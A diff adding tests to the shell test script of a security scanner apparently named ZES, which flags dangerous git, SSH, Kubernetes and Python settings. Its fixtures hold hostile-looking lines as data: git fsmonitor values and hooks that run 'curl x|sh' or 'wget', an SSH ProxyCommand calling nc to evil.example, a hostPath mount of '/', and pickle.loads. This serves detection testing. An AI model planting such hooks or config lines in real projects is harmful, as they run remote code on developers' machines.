@@ -969,6 +969,109 @@ N10="$TMP/r5-nm/node_modules"; mkdir -p "$N10/pk2/node_modules/x"
 got="$(run_scan "$N10" full "$FIX/_home" | jq -r --arg r "$N10/" '[.findings[] | select(.module == "§32" or .module == "§36") | "\(.level) \(.module) \(.path | ltrimstr($r)) \(.code)"] | sort | join(",")')"
 [ "$got" = "MEDIUM §32 pk2/model.pkl s32.pickle_model,MEDIUM §36 pk2/m.py s36.pickle" ] && ok "node_modules の下の検査ルートでも §32 / §36 を検査（スキップは検査ルートからの相対パスで判定）" || ng "node_modules の下の検査ルートの結果が違う: $got"
 
+echo "== round 6（0.5.4） =="
+# UI 1: Git configs are read as git reads them. The shared vectors (tests/gitconfig-cases.json, generated against git by
+#   tests/gen-gitconfig-cases.py and also checked against the UI's gitConfigVars) give the same variables
+if python3 -I -c 'pass' 2>/dev/null; then
+  gc="$(python3 -I "$TESTS_DIR/gen-gitconfig-cases.py" --check 2>&1)" && ok "tests/gitconfig-cases.json の Git 設定の読み取りを ZES_GITCFG_AWK で再現（git が受け付ける文は git と同じ変数）" \
+    || ng "Git 設定の読み取りが tests/gitconfig-cases.json と不一致" "$gc"
+else
+  printf '  SKIP tests/gitconfig-cases.json（python3 が無い）\n'
+fi
+
+# UI 1 (git itself): the r6-gitconfig fixtures that ZES reports make git run the command (git status runs core.fsmonitor,
+#   ls-remote over ssh runs core.sshCommand, commit runs the pre-commit hook of core.hooksPath); the ones ZES does not
+#   report run nothing. Only these fixture texts run, in a temporary repository (as zero-exec.sh does with its markers)
+if command -v git >/dev/null 2>&1; then
+  gv_bad=""
+  for d in "$FIX"/r6-gitconfig/*/; do
+    n="$(basename "$d")"; r="$TMP/r6-gitrun/$n"
+    ran="$( ( export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1; mkdir -p "$r/zes-hooks" && cd "$r" && git init -q . \
+      && printf '#!/bin/sh\ntouch hooks.ran\n' >zes-hooks/pre-commit && chmod +x zes-hooks/pre-commit && cat "$d/.gitconfig" >.git/config \
+      && { git status >/dev/null 2>&1; tmo 20 git ls-remote ssh://example.invalid/x >/dev/null 2>&1
+           git -c user.name=zes -c user.email=zes@example.invalid commit -q --allow-empty -m x >/dev/null 2>&1; true; } \
+      && ls ./*.ran 2>/dev/null | wc -l | tr -d ' ' ) )"
+    case "$n" in bools|lonecr|u2028) [ "$ran" = 0 ] || gv_bad="$gv_bad $n(ran:$ran)" ;; *) [ "$ran" -ge 1 ] 2>/dev/null || gv_bad="$gv_bad $n(not run)" ;; esac
+  done
+  [ -z "$gv_bad" ] && ok "r6-gitconfig: ZES が報告する設定は git が実行し、報告しない設定（真偽値・単独の CR・U+2028）は実行しない" || ng "r6-gitconfig と git の実行が合わない:$gv_bad"
+else
+  printf '  SKIP r6-gitconfig を git で実行する確認（git が無い）\n'
+fi
+
+# UI 1 / UI 3 / UI 4 (CLI side of ui/tests/unit/r6.test.ts, same tree and rows): include.path on the header line, every
+#   fsmonitor assignment, a lone CR, pointers read as bytes (BOM, NUL, 4096-byte cap), ".." resolved on the tree, a path
+#   that leaves the folder and comes back through its name, and a 3 MB config whose include target is read
+G6="$TMP/r6-git/r6g"; mkdir -p "$G6/.git" "$G6/lw/.git" "$G6/cr/.git" "$G6/bom" "$G6/nul" "$G6/nope" "$G6/re" "$G6/cap" "$G6/ü"
+for g in g1 g2 g2d g3 g4 g5; do mkdir -p "$G6/$g/hooks"; printf 'ref: x\n' >"$G6/$g/HEAD"; done
+printf 'x\n' >"$G6/README"; printf 'ref: refs/heads/main\n' >"$G6/.git/HEAD"
+printf '[core]\n\tfsmonitor = false\n[include] path = inc.cfg\n' >"$G6/.git/config"; printf '[core] fsmonitor = "curl x|sh"\n' >"$G6/.git/inc.cfg"
+printf 'ref: x\n' >"$G6/lw/.git/HEAD"; printf '[core]\n\tfsmonitor = false\n\tfsmonitor = "curl x|sh"\n' >"$G6/lw/.git/config"
+printf 'ref: x\n' >"$G6/cr/.git/HEAD"; printf '[core]\n\tbare = false\rfsmonitor = "curl x|sh"\n' >"$G6/cr/.git/config"
+printf '\357\273\277gitdir: ../g1\n' >"$G6/bom/.git"; printf '#!/bin/sh\ncurl x|sh\n' >"$G6/g1/hooks/post-checkout"
+printf 'gitdir: ../g2\000d\n' >"$G6/nul/.git"; printf '#!/bin/sh\ncurl x|sh\n' >"$G6/g2/hooks/pre-commit"; printf '#!/bin/sh\nwget x\n' >"$G6/g2d/hooks/pre-commit"
+printf 'gitdir: ../missing/../g3\n' >"$G6/nope/.git"; printf '#!/bin/sh\ncurl x|sh\n' >"$G6/g3/hooks/pre-push"
+printf 'gitdir: ../../r6g/g4\n' >"$G6/re/.git"; printf '#!/bin/sh\nwget x\n' >"$G6/g4/hooks/post-merge"
+{ printf 'gitdir: ../'; for _ in $(seq 700); do printf 'ü/../'; done; printf 'g5\n'; } >"$G6/cap/.git"; printf 'y\n' >"$G6/ü/x"; printf '#!/bin/sh\ncurl x|sh\n' >"$G6/g5/hooks/pre-commit"
+got="$(run_scan "$G6" full "$FIX/_home" | jq -r --arg r "$G6" '[.findings[] | select(.module == "§7" or .module == "§26") | select(.path | startswith($r))
+    | "\(.level) \(.module) \(.path | ltrimstr($r + "/")) \(.code)"] | sort | .[]')"
+want='CRITICAL §26 .git/inc.cfg s26.fsmonitor
+CRITICAL §26 lw/.git/config s26.fsmonitor
+HIGH §7 g2/hooks/pre-commit s7.git_hook_suspicious
+HIGH §7 g4/hooks/post-merge s7.git_hook_suspicious'
+[ "$got" = "$want" ] && ok "Git の設定（見出し行のキー・すべての代入・単独の CR）とポインタ（BOM・NUL・4096 バイト・実在しない ..・フォルダへ戻るパス）が UI の r6.test.ts と同じ" || ng "Git の設定・ポインタの結果が UI と異なる" "$got"
+U6="$TMP/r6-gitbig"; mkdir -p "$U6/.git"; printf 'x\n' >"$U6/README"; printf 'ref: x\n' >"$U6/.git/HEAD"
+{ printf '[include]\n\tpath = x.cfg\n#'; head -c 3000000 /dev/zero | tr '\0' a; echo; } >"$U6/.git/config"; printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$U6/.git/x.cfg"
+run_scan "$U6" full "$FIX/_home" | jq -e --arg p "$U6/.git/x.cfg" '[.findings[] | select(.code == "s26.fsmonitor") | .path] == [$p]' >/dev/null 2>&1 \
+  && ok "3 MB の .git/config の include 先の fsmonitor を報告（UI も 16 MiB まで読む）" || ng "大きな .git/config の include 先が報告されない"
+
+# R6-CLI-3: the same finding emitted twice (two FROM lines with the same image) is merged without duplicate_finding_id
+D6="$FIX/r6-dockerfile/twice"
+run_scan "$D6" quick "$FIX/_home" | jq -e '([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)
+    and ([.findings[] | select(.code == "s8.floating_image")] | length == 1)' >/dev/null 2>&1 \
+  && ok "同じ finding の再出力は duplicate_finding_id にせず 1 件にまとめる（UI と同じ）" || ng "同じ finding の再出力が errors[] に記録される"
+
+# R6-CLI-4: the TOML readers stay linear on a long dotted header with many keys, a long dotted key, and 1 MB of
+#   single-quoted strings in pyproject.toml (they took minutes); the new Git config and lenient JSON readers too
+B6="$TMP/r6-big"; mkdir -p "$B6"
+awk 'BEGIN { printf "[a"; for (i = 0; i < 40000; i++) printf ".a"; print "]"; for (i = 0; i < 40000; i++) print "k" i "=1" }' >"$B6/t1.toml"
+awk 'BEGIN { printf "x"; for (i = 0; i < 300000; i++) printf ".a"; print " = 1" }' >"$B6/t2.toml"
+awk 'BEGIN { printf "[build-system]\nrequires = ["; for (i = 0; i < 350000; i++) printf "\047\047,"; print "\047\047]" }' >"$B6/p1.toml"
+awk 'BEGIN { printf "[build-system]\n["; for (i = 0; i < 1000000; i++) printf " "; print "]" }' >"$B6/p2.toml"
+awk 'BEGIN { for (i = 0; i < 300000; i++) printf "[a]"; print ""; print "[core]"; printf "k = \""; for (i = 0; i < 300000; i++) printf "\\\""; print "\"" }' >"$B6/g1.cfg"
+awk 'BEGIN { for (i = 0; i < 200000; i++) printf "["; for (i = 0; i < 200000; i++) printf "]"; printf "{\"a\":{"; for (i = 0; i < 50000; i++) printf "\"command\":\"x\",\"args\":[\"y\"],"; print "\"z\":1}}" }' >"$B6/j1.json"
+t_ok=1; t_msg=""
+for spec in codex_toml_mcp_commands:t1.toml codex_toml_mcp_commands:t2.toml pyproject_build_system:p1.toml pyproject_build_system:p2.toml git_cfg_vars:g1.cfg json_lenient:j1.json; do
+  fn="${spec%%:*}"; fx="${spec#*:}"; t0="$(date +%s)"
+  # the function (one line or a block up to "}") and the awk programs it uses
+  tmo 60 bash -c 'eval "$(sed -n "/^text_lines() /p; /^ZES_AWK_LIB=/,/^'"'"'\$/p; /^ZES_GITCFG_AWK=/,/^'"'"'\$/p; /^ZES_JSONW_AWK=/,/^'"'"'\$/p; /^GIT_CFG_MAX=/p; /^read_capped() /p; /^READ_TIMEOUT=/p" "$1"
+      awk -v f="$2() {" '"'"'index($0, f) == 1 { print; p = ($0 !~ /}[ \t]*$/); next } p { print; if ($0 ~ /^}/) p = 0 }'"'"' "$1")"
+    run_timeout() { shift; "$@"; }; zes_src() { SRC="$1"; }; set -o pipefail; "$2" "$3" >/dev/null' _ "$SCAN" "$fn" "$B6/$fx"; rc=$?
+  t1="$(date +%s)"
+  { [ "$rc" = 0 ] && [ $((t1 - t0)) -le 20 ]; } || { t_ok=0; t_msg="$t_msg $fn($fx):rc=$rc,$((t1 - t0))s"; }
+done
+[ "$t_ok" -eq 1 ] && ok "TOML（長いドット区切りの見出し・キー）・pyproject（1 MB の文字列）・Git 設定・緩い JSON の読み取りは数秒（線形時間）" || ng "読み取りが遅い:$t_msg"
+
+# R6-CLI-6 / 7 / 8: the BOM-free view for a Kubernetes manifest and a file of the inspected HOME, a name with a TAB maps back,
+#   and a 2 GB sparse file with a BOM is not copied (bom_not_stripped is recorded)
+K6="$TMP/r6-bom"; mkdir -p "$K6/k" "$K6/t" "$K6/s" "$K6/h/.ssh"
+printf '\357\273\277apiVersion: v1\nkind: Pod\nspec:\n  volumes:\n    - name: r\n      hostPath:\n        path: /\n' >"$K6/k/pod.yaml"
+printf '\357\273\277import pickle\npickle.loads(x)\n' >"$K6/t/a	b.py"
+printf '\357\273\277ProxyCommand nc evil.example 22\n' >"$K6/h/.ssh/config"
+printf '\357\273\277' >"$K6/s/big.txt"; truncate -s 2G "$K6/s/big.txt" 2>/dev/null || : >"$K6/s/big.txt"
+b_ok=1
+run_scan "$K6/k" full "$FIX/_home" | jq -e '[.findings[] | select(.code == "s29.host_path")] | length == 1' >/dev/null 2>&1 || b_ok=0
+run_scan "$K6/t" full "$FIX/_home" | jq -e --arg p "$K6/t/a	b.py" '[.findings[] | select(.code == "s36.pickle") | .path] == [$p]' >/dev/null 2>&1 || b_ok=0
+run_scan "$K6/t" full "$K6/h" | jq -e '[.findings[] | select(.code == "s34.ssh_proxy")] | length == 1' >/dev/null 2>&1 || b_ok=0
+TMPDIR="$TMP" run_scan "$K6/s" quick "$FIX/_home" | jq -e --arg p "$K6/s/big.txt" '[.errors[] | select(.reason == "bom_not_stripped:" + $p)] | length == 1' >/dev/null 2>&1 || b_ok=0
+rm -f "$K6/s/big.txt"
+[ "$b_ok" -eq 1 ] && ok "BOM: k8s のマニフェストと HOME のファイルも BOM なしで読み、タブを含む名前は元に戻し、2 GB のファイルは写さない" || ng "BOM の扱いが不十分（k8s / HOME / タブ / 大きなファイル）"
+
+# R6-CLI-9: without jq, a dangerous hook is reported once (s17.agent_hook, as with jq), with its locator
+H6="$FIX/r5-agent-hook/hook"
+a="$(run_scan "$H6" full "$FIX/_home" | jq -c '[.findings[] | select(.module == "§17") | {code, locators}] | sort_by(.code)')"
+b="$(ZES_FORCE_NO_JQ=1 run_scan "$H6" full "$FIX/_home" | jq -c '[.findings[] | select(.module == "§17") | {code, locators}] | sort_by(.code)')"
+[ -n "$a" ] && [ "$a" = "$b" ] && ok "jq なしでもフックを 1 回だけ報告（jq ありと同じ code と locators）" || ng "jq の有無でフックの報告が違う: $a / $b"
+
 echo
 echo "結果: PASS=$PASS FAIL=$FAIL"
 [ "$FAIL" -eq 0 ]
